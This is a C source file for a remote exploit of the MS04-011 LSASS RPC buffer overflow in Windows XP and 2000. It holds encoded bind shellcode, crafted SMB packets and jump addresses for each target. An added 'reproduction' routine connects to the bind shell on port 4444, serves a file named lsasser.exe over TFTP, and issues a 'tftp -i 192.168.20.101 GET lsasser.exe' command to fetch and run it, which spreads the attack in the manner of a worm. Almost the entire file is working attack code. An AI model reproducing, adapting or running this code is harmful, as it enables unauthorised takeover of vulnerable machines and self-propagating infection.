#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")
int ready;
// bind shellcode
unsigned char bindshell[] =
    "\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA"
    "\xEB\x05\xE8\xEB\xFF\xFF\xFF"
    "\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
    "\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"
    "\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"
    "\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"
    "\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"
    "\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"
    "\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0"
    "\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"
    "\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B"
    "\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99\x9D\x4B\xAA\x59\x10\xDE\x9D"
    "\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98\xCA\x66\xCE\x6D\xC9\xC9\xCA"
    "\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12\x6D\xAA\x59\xF3\x89\xC0\x10"
    "\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF\xA5\x10\xCF\xD9\xFF\x5E\xDF"
    "\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA\x50\xC8\xC8\xC8\xF3\x98\xC8"
    "\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xC8\x66\xCE\x79"
    "\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9\x66\xCE\x7D\xAA\x59\x35\x1C"
    "\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59"
    "\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD"
    "\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC"
    "\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD\x99\xD5"
    "\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6"
    "\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0"
    "\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED"
    "\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED\x99";

char req1[] =
    "\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
    "\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F"
    "\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02"
    "\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F"
    "\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70"
    "\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
    "\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54"
    "\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00";

char req2[] =
    "\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
    "\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00"
    "\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E"
    "\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00"
    "\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
    "\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00"
    "\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
    "\x2E\x00\x30\x00\x00\x00\x00\x00";

char req3[] =
    "\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
    "\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00"
    "\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E"
    "\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46"
    "\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40"
    "\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40"
    "\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48"
    "\x00\x4F\x00\x44\x00\x00\x81\x19\x6A\x7A\xF2\xE4\x49\x1C\x28\xAF"
    "\x30\x25\x74\x10\x67\x53\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00"
    "\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"
    "\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00"
    "\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00"
    "\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00";

char req4[] =
    "\x00\x00\x00\x5C\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
    "\x00\x08\x30\x00\x04\xFF\x00\x5C\x00\x08\x00\x01\x00\x31\x00\x00"
    "\x5C\x00\x5C\x00\x31\x00\x39\x00\x32\x00\x2E\x00\x31\x00\x36\x00"
    "\x38\x00\x2E\x00\x31\x00\x2E\x00\x32\x00\x31\x00\x30\x00\x5C\x00"
    "\x49\x00\x50\x00\x43\x00\x24"
    "\x00\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";

char req5[] =
    "\x00\x00\x00\x64\xFF\x53\x4D\x42\xA2\x00\x00\x00\x00\x18\x07\xC8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"
    "\x00\x08\x40\x00\x18\xFF\x00\xDE\xDE\x00\x0E\x00\x16\x00\x00\x00"
    "\x00\x00\x00\x00\x9F\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00"
    "\x02\x00\x00\x00\x03\x11\x00\x00\x5C\x00\x6C\x00\x73\x00\x61\x00"
    "\x72\x00\x70\x00\x63\x00\x00\x00";

char req6[] =
    "\x00\x00\x00\x9C\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"
    "\x00\x08\x50\x00\x10\x00\x00\x48\x00\x00\x00\x00\x04\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x48\x00\x54\x00\x02"
    "\x00\x26\x00\x00\x40\x59\x00\x10\x5C\x00\x50\x00\x49\x00\x50\x00"
    "\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x0B\x03\x10\x00\x00\x00"
    "\x48\x00\x00\x00\x01\x00\x00\x00\xB8\x10\xB8\x10\x00\x00\x00\x00"
    "\x01\x00\x00\x00\x00\x00\x01\x00\x6A\x28\x19\x39\x0C\xB1\xD0\x11"
    "\x9B\xA8\x00\xC0\x4F\xD9\x2E\xF5\x00\x00\x00\x00\x04\x5D\x88\x8A"
    "\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00";

char req7[] =
    "\x00\x00\x0C\xF4\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xDC\x04"
    "\x00\x08\x60\x00\x10\x00\x00\xA0\x0C\x00\x00\x00\x04\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\xA0\x0C\x54\x00\x02"
    "\x00\x26\x00\x00\x40\xB1\x0C\x10\x5C\x00\x50\x00\x49\x00\x50\x00"
    "\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x03\x10\x00\x00\x00"
    "\xA0\x0C\x00\x00\x01\x00\x00\x00\x88\x0C\x00\x00\x00\x00\x09\x00"
    "\xEC\x03\x00\x00\x00\x00\x00\x00\xEC\x03\x00\x00";
// room for shellcode here ...

char shit1[] =

    "\x95\x14\x40\x00\x03\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00"
    "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
    "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
    "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
    "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x7C\x70\x40\x00"
    "\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
    "\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
    "\x00\x00\x00\x00\x7C\x70\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"
    "\x01\x00\x00\x00\x00\x00\x00\x00\x78\x85\x13\x00\xAB\x5B\xA6\xE9";

char req8[] =
    "\x00\x00\x10\xF8\xFF\x53\x4D\x42\x2F\x00\x00\x00\x00\x18\x07\xC8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
    "\x00\x08\x60\x00\x0E\xFF\x00\xDE\xDE\x00\x40\x00\x00\x00\x00\xFF"
    "\xFF\xFF\xFF\x08\x00\xB8\x10\x00\x00\xB8\x10\x40\x00\x00\x00\x00"
    "\x00\xB9\x10\xEE\x05\x00\x00\x01\x10\x00\x00\x00\xB8\x10\x00\x00"
    "\x01\x00\x00\x00\x0C\x20\x00\x00\x00\x00\x09\x00\xAD\x0D\x00\x00"
    "\x00\x00\x00\x00\xAD\x0D\x00\x00";
// room for shellcode here ...

char req9[] =
    "\x00\x00\x0F\xD8\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x18\x01"
    "\x00\x08\x70\x00\x10\x00\x00\x84\x0F\x00\x00\x00\x04\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x84\x0F\x54\x00\x02"
    "\x00\x26\x00\x00\x40\x95\x0F\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
    "\x45\x00\x5C\x00\x00\x00\x00\x00\x05\x00\x00\x02\x10\x00\x00\x00"
    "\x84\x0F\x00\x00\x01\x00\x00\x00\x6C\x0F\x00\x00\x00\x00\x09\x00";

char shit3[] =
    "\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"
    "\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
    "\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
    "\x01\x00\x00\x00"
    "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
    "\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00\x00\x00\x00\x00"
    "\x01\x00\x00\x00\x00\x00\x00\x00\x9A\xA8\x40\x00\x01\x00\x00\x00"
    "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x9A\xA8\x40\x00"
    "\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00";

#define LEN 3500
#define BUFSIZE 2000
#define NOP 0x90

struct targets
{

  int num;
  char name[50];
  long jmpaddr;

} ttarget[] = {

    {0, "WinXP Professional    [universal] lsass.exe ", 0x01004600}, // jmp esp addr
    {1, "Win2k Professional    [universal] netrap.dll", 0x7515123c}, // jmp ebx addr
    {2, "Win2k Advanced Server [SP4]       netrap.dll", 0x751c123c}, // jmp ebx addr
    //{ 3, "reboot", 0xffffffff }, // crash
    {NULL}

};

void usage(char *prog)
{
  int i;
  printf("Usage:\n\n");
  printf("%s <target> <victim IP> <bindport> [connectback IP] [options]\n\n", prog);
  printf("Targets:\n");
  for (i = 0; i < 3; i++)
    printf(" %d [0x%.8x]: %s\n", ttarget[i].num, ttarget[i].jmpaddr, ttarget[i].name);
  printf("\nOptions:\n");
  printf(" -t: Detect remote OS:\n");
  printf(" Windows 5.1 - WinXP\n");
  printf(" Windows 5.0 - Win2k\n\n");
  exit(0);
}

int exploit(int OS, char *target, int port, int opt)
{

  int i;
  char hostipc[40];
  char hostipc2[40 * 2];

  unsigned long ip;
  unsigned char *sc;

  char buf[LEN + 1];
  char sendbuf[(LEN + 1) * 2];

  char req4u[sizeof(req4) + 20];

  char screq[BUFSIZE + sizeof(req7) + 1500 + 440];
  char screq2k[4348 + 4060];
  char screq2k2[4348 + 4060];

  char recvbuf[1600];

  char strasm[] = "\x66\x81\xEC\x1C\x07\xFF\xE4";
  char strBuffer[BUFSIZE];

  unsigned int targetnum = 0;

  int len, sockfd;
  short dport = 445;
  struct hostent *he;
  struct sockaddr_in their_addr;
  char smblen;
  char unclen;
  WSADATA wsa;

  printf("\nMS04011 Lsasrv.dll RPC buffer overflow remote exploit v0.1\n");
  printf("--- Coded by .::[ houseofdabus ]::. ---\n\n");

  sprintf((char *)hostipc, "\\\\%s\\ipc$", target);

  for (i = 0; i < 40; i++)
  {
    hostipc2[i * 2] = hostipc[i];
    hostipc2[i * 2 + 1] = 0;
  }

  memcpy(req4u, req4, sizeof(req4) - 1);
  memcpy(req4u + 48, &hostipc2[0], strlen(hostipc) * 2);
  memcpy(req4u + 47 + strlen(hostipc) * 2, req4 + 87, 9);

  smblen = 52 + (char)strlen(hostipc) * 2;
  memcpy(req4u + 3, &smblen, 1);

  unclen = 9 + (char)strlen(hostipc) * 2;
  memcpy(req4u + 45, &unclen, 1);

  port = htons(port) ^ (USHORT)0x9999;
  memcpy(&bindshell[176], &port, 2);
  sc = bindshell;

  if ((OS == 1) || (OS == 2))
  {
    memset(buf, NOP, LEN);

    // memcpy(&buf[2020], "\x3c\x12\x15\x75", 4);
    memcpy(&buf[2020], &ttarget[OS].jmpaddr, 4);
    memcpy(&buf[2036], sc, strlen(sc));

    memcpy(&buf[2840], "\xeb\x06\xeb\x06", 4);
    memcpy(&buf[2844], &ttarget[OS].jmpaddr, 4); // jmp ebx addr
    // memcpy(&buf[2844], "\x3c\x12\x15\x75", 4); // jmp ebx addr

    memcpy(&buf[2856], sc, strlen(sc));

    for (i = 0; i < LEN; i++)
    {
      sendbuf[i * 2] = buf[i];
      sendbuf[i * 2 + 1] = 0;
    }
    sendbuf[LEN * 2] = 0;
    sendbuf[LEN * 2 + 1] = 0;

    memset(screq2k, 0x31, (BUFSIZE + sizeof(req7) + 1500) * 2);
    memset(screq2k2, 0x31, (BUFSIZE + sizeof(req7) + 1500) * 2);
  }
  else
  {
    memset(strBuffer, NOP, BUFSIZE);
    memcpy(strBuffer + 160, sc, strlen(sc));
    memcpy(strBuffer + 1980, strasm, strlen(strasm));
    *(long *)&strBuffer[1964] = ttarget[OS].jmpaddr;
  }

  memset(screq, 0x31, BUFSIZE + sizeof(req7) + 1500);

  WSAStartup(MAKEWORD(2, 0), &wsa);

  if ((he = gethostbyname(target)) == NULL)
  { // get the host info
    perror("[-] gethostbyname ");
    exit(1);
  }

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
  {
    perror("socket");
    exit(1);
  }

  their_addr.sin_family = AF_INET;
  their_addr.sin_port = htons(dport);
  their_addr.sin_addr = *((struct in_addr *)he->h_addr);
  memset(&(their_addr.sin_zero), '\0', 8);

  printf("[*] Target: IP: %s: OS: %s\n", target, ttarget[OS].name);
  printf("[*] Connecting to %s:445 ... ", target);
  if (connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1)
  {
    printf("\n[-] Sorry, cannot connect to %s:445. Try again...\n", target);
    exit(1);
  }
  printf("OK\n");

  if (send(sockfd, req1, sizeof(req1) - 1, 0) == -1)
  {
    printf("[-] Send failed\n");
    exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if (send(sockfd, req2, sizeof(req2) - 1, 0) == -1)
  {
    printf("[-] Send failed\n");
    exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if (send(sockfd, req3, sizeof(req3) - 1, 0) == -1)
  {
    printf("[-] Send failed\n");
    exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if (opt == 1)
  {
    printf("[*] Detecting remote OS: ");
    for (i = 0; i < 12; i++)
    {
      printf("%c", recvbuf[48 + i * 2]);
    }
    printf("\n");
    exit(0);
  }

  printf("[*] Attacking ... ");
  if (send(sockfd, req4u, smblen + 4, 0) == -1)
  {
    printf("[-] Send failed\n");
    exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if (send(sockfd, req5, sizeof(req5) - 1, 0) == -1)
  {
    printf("[-] Send failed\n");
    exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if (send(sockfd, req6, sizeof(req6) - 1, 0) == -1)
  {
    printf("[-] Send failed\n");
    exit(1);
  }
  len = recv(sockfd, recvbuf, 1600, 0);

  if ((OS == 1) || (OS == 2))
  {
    memcpy(screq2k, req8, sizeof(req8) - 1);
    memcpy(screq2k + sizeof(req8) - 1, sendbuf, (LEN + 1) * 2);

    memcpy(screq2k2, req9, sizeof(req9) - 1);
    memcpy(screq2k2 + sizeof(req9) - 1, sendbuf + 4348 - sizeof(req8) + 1, (LEN + 1) * 2 - 4348);

    memcpy(screq2k2 + sizeof(req9) - 1 + (LEN + 1) * 2 - 4348 - sizeof(req8) + 1 + 206, shit3, sizeof(shit3) - 1);

    if (send(sockfd, screq2k, 4348, 0) == -1)
    {
      printf("[-] Send failed\n");
      exit(1);
    }
    len = recv(sockfd, recvbuf, 1600, 0);

    if (send(sockfd, screq2k2, 4060, 0) == -1)
    {
      printf("[-] Send failed\n");
      exit(1);
    }
  }
  else
  {
    memcpy(screq, req7, sizeof(req7) - 1);
    memcpy(screq + sizeof(req7) - 1, &strBuffer[0], BUFSIZE);
    memcpy(screq + sizeof(req7) - 1 + BUFSIZE, shit1, 9 * 16);

    screq[BUFSIZE + sizeof(req7) - 1 + 1500 - 304 - 1] = 0;
    if (send(sockfd, screq, BUFSIZE + sizeof(req7) - 1 + 1500 - 304, 0) == -1)
    {
      printf("[-] Send failed\n");
      exit(1);
    }
  }
  printf("OK\n");
  reproduction(target);
  len = recv(sockfd, recvbuf, 1600, 0);

  return 0;
}

DWORD WINAPI tftpd(LPVOID lpParam)
{
  FILE *tftp_file;              /* pointer to the file to be sent	*/
  int tftp_send_len;            /* packet size				*/
  char tftp_recv_buf[516];      /* data receive buffer			*/
  struct sockaddr_in tftp_addr; /* for bind()				*/
  char tftp_from[16];           /* recvfrom() address			*/
  int tftp_addr_len;            /* address size				*/
  char tftp_send_buf[516];      /* data send buffer			*/

  /* listening socket */
  int tftp_sock = socket(PF_INET, SOCK_DGRAM, 0);

  if (tftp_sock != -1)
  {
    /* clear the structure */
    memset((void *)&tftp_addr, 0, sizeof(tftp_addr));

    tftp_addr.sin_family = PF_INET;
    /* standard tftp port */
    tftp_addr.sin_port = htons(69);
    /* as before */
    tftp_addr.sin_addr.s_addr = 0;

    /* attach to TFTPD port */
    if (bind(tftp_sock, (struct sockaddr *)&tftp_addr,
             sizeof(tftp_addr)) == 0)
    {
      tftp_addr_len = 16;
      printf("FTP Pret\n");
      /* waiting for command, sending file as a response */
      if (recvfrom(tftp_sock, tftp_recv_buf, sizeof(tftp_recv_buf), 0,
                   (void *)tftp_from, &tftp_addr_len) >= 1)
      {
        /* correct register int */
        int tftp_count = 0;

        /* "rb" for windows */
        tftp_file = fopen("lsasser.exe", "rb");

        if (tftp_file)
        {
          printf("Envoi");
          while (1)
          {
            tftp_count++;
            printf(".");
            /* tftp data packet */
            *(short *)tftp_send_buf = htons(3);
            /* sequential number */
            *(short *)(tftp_send_buf + 2) = htons(tftp_count);

            /* data read + 4 bytes of header */
            tftp_send_len = fread(&tftp_send_buf[4], 1, 512, tftp_file) + 4;

            /* sending */
            if (sendto(tftp_sock, tftp_send_buf, tftp_send_len, 0,
                       (void *)tftp_from, tftp_addr_len) < 1)
              goto out;

            Sleep(0x384);

            /* end of file, probably */
            if (tftp_send_len < 516)
              break;
          }

          fclose(tftp_file);
          tftp_file = NULL;
        out:
          /* if sendto fails, here's where we end up */
          if (tftp_file)
            fclose(tftp_file);
        }
      }
    }
  }

  close(tftp_sock);
  ready = 1;
  return 0;
}

void reproduction(char *ip1)
{
  struct hostent *hoste;
  WSADATA wd;
  WSAStartup(MAKEWORD(2, 0), &wd);
  // Crée le socket
  printf("Crée le socket\n");
  // resoud dns
  printf("DNS------>");
  hoste = gethostbyname(ip1);
  printf("%s\n", ip1);
  // Regle le sockaddr
  struct sockaddr_in sin;
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_port = htons(4444);
  memcpy(&(sin.sin_addr), hoste->h_addr, hoste->h_length);
  int sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  int test = connect(sock, (struct sockaddr *)&sin, sizeof(sin));
  if (test < 0)
  {
    printf("impossible de se connecter\n");
    printf("2eme tentative dans 10s\n");
    sleep(5000);
    int test2 = connect(sock, (struct sockaddr *)&sin, sizeof(sin));
    if (test2 < 0)
    {
      printf("impossible de se connecter\n");
      printf("3eme tentative dans 10s\n");
      sleep(5000);
      int test3 = connect(sock, (struct sockaddr *)&sin, sizeof(sin));
      if (test3 < 0)
      {
        return 0;
      }
    }
  };

  DWORD dwThreadId, dwThrdParam = 1;
  HANDLE hThread; // descripteur du thread
  // création du thread
  hThread = CreateThread(NULL, 0, tftpd, &dwThrdParam, 0, &dwThreadId);
  char dl[50];
  char exec[] = "lsasser.exe\n";
  sprintf(&dl, "tftp -i %s GET %s\n", "192.168.20.101", "lsasser.exe");
  printf("Attend......");
  sleep(2000);
  char recvbuf[5000];
  memset(recvbuf, '\0', 5000);
  recv(sock, recvbuf, 5000, 0);
  printf("%s", recvbuf);
  sleep(2000);
  send(sock, dl, strlen(dl), 0);
  sleep(2000);
  memset(recvbuf, '\0', 5000);
  recv(sock, recvbuf, 5000, 0);
  printf("%s", recvbuf);
  memset(recvbuf, '\0', 5000);
  recv(sock, recvbuf, 5000, 0);
  printf("%s", recvbuf);
  sleep(2000);
  send(sock, exec, strlen(exec), 0);
  sleep(2000);
  memset(recvbuf, '\0', 5000);
  recv(sock, recvbuf, 5000, 0);
  printf("%s", recvbuf);
  while (ready == 0)
  {
  }
  closesocket(sock);
  WSACleanup();
}

int main()
{
  ready = 0;
  exploit(0, "127.0.0.1", 4444, 0);
}
